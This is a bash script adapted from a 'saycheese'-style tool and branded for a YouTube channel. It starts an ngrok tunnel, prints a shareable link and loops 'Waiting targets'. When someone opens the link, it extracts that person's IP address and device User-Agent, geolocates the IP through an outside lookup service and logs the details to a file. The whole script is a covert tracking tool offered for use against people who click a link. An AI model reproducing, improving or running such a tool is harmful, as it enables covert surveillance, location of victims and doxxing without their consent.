#!/bin/bash
#Source git clone https://github.com/hangetzzu/saycheese.git
#EFX-TV just modified.
clear
tput setaf 1; echo "                   ╱▔▔▔▔╲    
                  ▕▕╲┊┊╱▏▏   
                  ▕▕▂╱╲▂▏▏   
                   ╲┊┊┊┊╱   
                   ▕╲▂▂╱▏   
               ╱▔▔▔▔┊┊┊┊▔▔▔▔╲
             Ngrok Quick Support
             ███████████████████
             █▄─▄▄─█▄─▄▄─█▄─▀─▄█
             ██─▄█▀██─▄████▀─▀█
	     ▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄█▄▄▀

	 ░█─── ▀█▀ ░█▄─░█ ░█─▄▀ ░█▀▀▀█
         ░█─── ░█─ ░█░█░█ ░█▀▄─ ─▀▀▀▄▄
         ░█▄▄█ ▄█▄ ░█──▀█ ░█─░█ ░█▄▄▄█ " | lolcat 
		echo "	Please subscribe EFX Tv		" |toilet -f term -F border --gay
		
printf "\e[1;92m[\e[0m+\e[1;92m] Checking for Ngrok Executable..."
sleep 3
if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;31m[\e[0m\e[1;37m-X\e[0m\e[1;31m]\e[0m\e[1;92m Ngrok not found in the directory...\e[0m\e[1;93m %s \n"
printf "\e[1;92m[\e[0mOk\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -q --show-progress
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip -q --show-progress
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok 
chmod +x ngrok-stable-linux-386.zip
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
#end
#echo -en "[\e[0mOk\e[1;92m] Enter the port number you want to forward :"
#read port
#killall -2 ngrok > /dev/null 2>&1
#pkill -f -2 ngrok > /dev/null 2>&1
#killall -2 php > /dev/null 2>&1
#killall -2 ssh > /dev/null 2>&1
#fuser -k $port/tcp > /dev/null 2>&1
#Extra added
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"

printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
pkill ngrok 
./ngrok http 6666 > /dev/null 2>&1 &
sleep 7
#Extra added ends
echo -e "[\e[0m+\e[1;92m] Please wait..."
sleep 2
clear
tput setaf 1; echo "                   ╱▔▔▔▔╲    
                  ▕▕╲┊┊╱▏▏   
                  ▕▕▂╱╲▂▏▏   
                   ╲┊┊┊┊╱   
                   ▕╲▂▂╱▏   
               ╱▔▔▔▔┊┊┊┊▔▔▔▔╲
             Ngrok Quick Support
             ███████████████████
             █▄─▄▄─█▄─▄▄─█▄─▀─▄█
             ██─▄█▀██─▄████▀─▀█
	     ▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄█▄▄▀

	 ░█─── ▀█▀ ░█▄─░█ ░█─▄▀ ░█▀▀▀█
         ░█─── ░█─ ░█░█░█ ░█▀▄─ ─▀▀▀▄▄
         ░█▄▄█ ▄█▄ ░█──▀█ ░█─░█ ░█▄▄▄█ " | lolcat 
		echo "	Please subscribe EFX Tv		" |toilet -f term -F border --gay

#below lines can be sued for generating direct link.
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"#\n"\n#g'|grep https|head -1)
printf "\e[1;31m[\e[0m\e[1;37mOk\e[0m\e[1;31m]\e[0m\e[1;92m Here is your Link :👉 \e[0m\e[1;93m %s \n" $ngrok_link
#Part generating direct link ends here.
#Extra added 2
#ip
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
device=$(grep -a 'User-Agent:' ip.txt | cut -d " " -f2- | tr -d '\r'|tr \) ' '|tr /} ' ')
iplookup=$(curl -s https://json.geoiplookup.io/$ip|tr , '\n'|tr \" ' '|tr }/ ' '|tr {/ ' '|tr a-z A-Z|tr -s ' '|grep -v "PREMIUM"|grep -v "SUCCESS"|grep "\S")
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] DEVICE:\e[0m\e[1;77m %s\e[0m\n" $device
#Progress bar
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Gathering more details\e[0m\e[1;77m %s\e[0m\n"
tput setaf 2; echo -ne '01010                     (33%)\r'
sleep 2
echo -ne '0101010101010             (66%)\r'
sleep 3
echo -ne '01010101010101010101010   (100%)\r'
echo -ne '\n' | lolcat
tput setaf 1; echo -ne 'HERE                         (33%)\r'
sleep 1
echo -ne 'HERE WE GO NO                (66%)\r'
sleep 1
echo -ne 'HERE WE GO NOW :SUCCESSFUL  (100%)\r'
echo -ne '\n' | lolcat
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] [============== Subscribe EFX TV ==================]\e[0m\e[1;77m %s\e[0m\n"
#PROGRESSBAR ENDS
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] [SUCCESS]:\e[0m\e[1;77m %s\e[0m\n" $iplookup
cat ip.txt >> ip_clicked.txt
rm -rf ip.txt
}
#Exit

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
fi
done
#extra added 2 ends
